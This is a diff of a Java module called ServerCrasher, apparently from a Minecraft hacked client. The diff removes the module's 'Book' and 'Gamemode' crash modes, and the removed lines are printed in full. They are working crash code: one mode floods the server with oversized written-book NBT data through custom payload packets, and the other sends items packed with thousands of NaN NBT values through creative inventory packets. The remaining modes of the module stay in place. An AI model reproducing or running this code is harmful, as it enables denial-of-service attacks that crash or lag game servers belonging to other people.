@@ -41,8 +41,6 @@ public class ServerCrasher extends Module {
         this.mode.addValue("AACold");
         this.mode.addValue("massivechunkloading");
         this.mode.addValue("Slowly");
-        this.mode.addValue("Book");
-        this.mode.addValue("Gamemode");
         this.mode.addValue("Fly");
 
     }
@@ -106,71 +104,6 @@ public class ServerCrasher extends Module {
             }
         }
 
-
-
-        if(mode.isCurrentMode("Book")) {
-            NetHandlerPlayClient sendQueue = mc.thePlayer.sendQueue;
-            try {
-                ItemStack bookObj = new ItemStack(Items.written_book);
-                String author = "NMSL" + Math.random() * 400.0D;
-                String title = "xD" + Math.random() * 400.0D;
-                String mm255 = "wveb54yn4y6y6hy6hb54yb5436by5346y3b4yb343yb453by45b34y5by34yb543yb54y5 h3y4h97,i567yb64t5vr2c43rc434v432tvt4tvybn4n6n57u6u57m6m6678mi68,867,79o,o97o,978iun7yb65453v4tyv34t4t3c2cc423rc334tcvtvt43tv45tvt5t5v43tv5345tv43tv5355vt5t3tv5t533v5t45tv43vt4355t54fwveb54yn4y6y6hy6hb54yb5436by5346y3b4yb343yb453by45b34y5by34yb543yb54y5 h3y4h97,i567yb64t5vr2c43rc434v432tvt4tvybn4n6n57u6u57m6m6678mi68,867,79o,o97o,978iun7yb65453v4tyv34t4t3c2cc423rc334tcvtvt43tv45tvt5t5v43tv5345tv43tv5355vt5t3tv5t533v5t45tv43vt4355t54fwveb54yn4y6y6hy6hb54yb5436by5346y3b4yb343yb453by45b34y5by34yb543yb54y5 h3y4h97,i567yb64t5";
-                NBTTagCompound tag = new NBTTagCompound();
-                NBTTagList list = new NBTTagList();
-
-                for (int i = 0; i < 50; i++) {
-                    String siteContent = mm255;
-                    NBTTagString tString = new NBTTagString(siteContent);
-                    list.appendTag(tString);
-                }
-
-                tag.setString("author", author);
-                tag.setString("title", title);
-                tag.setTag("pages", list);
-
-                if (bookObj.hasTagCompound()) {
-                    NBTTagCompound nbttagcompound = bookObj.getTagCompound();
-                    nbttagcompound.setTag("pages", list);
-                } else {
-                    bookObj.setTagInfo("pages", list);
-                }
-
-                String s2 = "MC|BEdit";
-
-                if (new Random().nextBoolean()) {
-                    s2 = "MC|BSign";
-                }
-
-                bookObj.setTagCompound(tag);
-                PacketBuffer packetbuffer = new PacketBuffer(Unpooled.buffer());
-                packetbuffer.writeItemStackToBuffer(bookObj);
-                mc.thePlayer.sendQueue.addToSendQueue(new C17PacketCustomPayload(s2, packetbuffer));
-            } catch (Exception localException) {
-            }
-        }
-
-        if(mode.isCurrentMode("Gamemode")) {
-            if (mc.playerController.isNotCreative()) {
-                ChatUtil.sendClientMessage("In order for the crasher to work you have to be in GM 1!");
-                return;
-            }
-            ChatUtil.sendClientMessage("The server should now lag!");
-            ItemStack itm = new ItemStack(Blocks.stone);
-            String crashText = "";
-            NBTTagCompound base = new NBTTagCompound();
-            int i3 = 0;
-            while (i3 < 30000) {
-                base.setDouble(String.valueOf(i3), Double.NaN);
-                ++i3;
-            }
-            itm.setTagCompound(base);
-            i3 = 0;
-
-            while (i3 < 40) {
-                mc.thePlayer.sendQueue.addToSendQueue(new C10PacketCreativeInventoryAction(i3, itm));
-                ++i3;
-            }
-        }
 
         if(mode.isCurrentMode("Fly")) {
             double x;
